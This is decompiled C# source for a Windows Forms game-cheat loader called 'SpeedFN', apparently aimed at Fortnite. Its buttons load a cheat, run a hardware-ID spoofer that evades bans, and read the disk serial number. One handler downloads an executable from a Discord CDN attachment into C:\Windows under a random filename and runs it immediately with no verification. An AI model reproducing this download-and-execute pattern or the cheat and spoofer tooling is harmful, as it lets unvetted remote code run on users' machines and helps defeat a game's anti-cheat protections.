using System;
using System.ComponentModel;
using System.Diagnostics;
using System.Drawing;
using System.Management;
using System.Net;
using System.Windows.Forms;
using Guna.UI.WinForms;
using Siticone.UI.WinForms;
using Siticone.UI.WinForms.Enums;
using SpeedFNLoader;

namespace DampLoader
{
	// Token: 0x02000009 RID: 9
	public partial class SpeedFN : Form
	{
		// Token: 0x06000011 RID: 17 RVA: 0x00002292 File Offset: 0x00000492
		public SpeedFN()
		{
			this.InitializeComponent();
		}

		// Token: 0x06000012 RID: 18 RVA: 0x000022A0 File Offset: 0x000004A0
		public void Form1_Load(object sender, EventArgs e)
		{
		}

		// Token: 0x06000013 RID: 19 RVA: 0x000022A2 File Offset: 0x000004A2
		private void close_Click_1(object sender, EventArgs e)
		{
			Application.Exit();
		}

		// Token: 0x06000014 RID: 20 RVA: 0x000022A9 File Offset: 0x000004A9
		private void gunaButton1_Click(object sender, EventArgs e)
		{
			Cheat.Load();
		}

		// Token: 0x06000015 RID: 21 RVA: 0x000022B0 File Offset: 0x000004B0
		private void gunaButton2_Click(object sender, EventArgs e)
		{
			if (Process.GetProcessesByName("FortniteClient-Win64-Shipping").Length == 0)
			{
				Spoofer.Load();
			}
			else
			{
				MessageBox.Show("Make sure Fortnite is closed!");
			}
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
			string text = "";
			foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
			{
				text = ((ManagementObject)managementBaseObject)["SerialNumber"].ToString();
			}
			this.HWID.Text = text;
		}

		// Token: 0x06000016 RID: 22 RVA: 0x00002344 File Offset: 0x00000544
		private void gunaButton3_Click(object sender, EventArgs e)
		{
			string fileName = "C:\\Windows\\jiqruquroqitqotjkjtiqjtioqtiqtahtuanfcjanabcnavbjavkafvja.exe";
			new WebClient().DownloadFile("https://cdn.discordapp.com/attachments/734097285839061084/734147369540780062/Cleaner_By_Android.exe", fileName);
			Process.Start(fileName);
			Process.Start("https://discord.gg/rhhr6Et");
		}

		// Token: 0x06000017 RID: 23 RVA: 0x0000237C File Offset: 0x0000057C
		private void SpeedFN_Load(object sender, EventArgs e)
		{
			MessageBox.Show("SpeedFN | Made with heart by AndroidGenius#1212");
			ManagementObjectSearcher managementObjectSearcher = new ManagementObjectSearcher("SELECT * FROM Win32_DiskDrive");
			string text = "";
			foreach (ManagementBaseObject managementBaseObject in managementObjectSearcher.Get())
			{
				text = ((ManagementObject)managementBaseObject)["SerialNumber"].ToString();
			}
			this.HWID.Text = text;
		}

		// Token: 0x06000018 RID: 24 RVA: 0x000023FC File Offset: 0x000005FC
		private void siticoneLabel1_Click(object sender, EventArgs e)
		{
			Process.Start("https://discord.gg/rhhr6Et");
		}

		// Token: 0x06000019 RID: 25 RVA: 0x00002409 File Offset: 0x00000609
		private void HWID_Click(object sender, EventArgs e)
		{
		}

		// Token: 0x0600001A RID: 26 RVA: 0x0000240B File Offset: 0x0000060B
		private void minimize_Click(object sender, EventArgs e)
		{
			base.WindowState = FormWindowState.Minimized;
		}

		// Token: 0x0600001B RID: 27 RVA: 0x00002414 File Offset: 0x00000614
		private void fullscreen_Click(object sender, EventArgs e)
		{
		}
	}
}
